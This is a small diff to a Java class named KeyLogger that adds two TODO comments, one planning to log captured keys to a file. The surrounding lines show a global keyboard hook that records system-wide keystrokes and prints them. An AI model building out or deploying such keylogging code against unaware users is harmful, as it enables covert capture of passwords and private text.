@@ -12,7 +12,7 @@ public class KeyLogger {
     private static boolean run = true;
     private static boolean capsLock;
 
-    public static void main(String[] args) {
+    public static void main(String[] args) {//TODO add logger into file
         capsLock = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
 
         GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
@@ -26,7 +26,7 @@ public class KeyLogger {
                     case GlobalKeyEvent.VK_CAPITAL:
                         capsLock = !capsLock;
                         break;
-                    case GlobalKeyEvent.VK_BACK:
+                    case GlobalKeyEvent.VK_BACK://TODO
                         break;
                     case GlobalKeyEvent.VK_RETURN:
                         System.out.println();
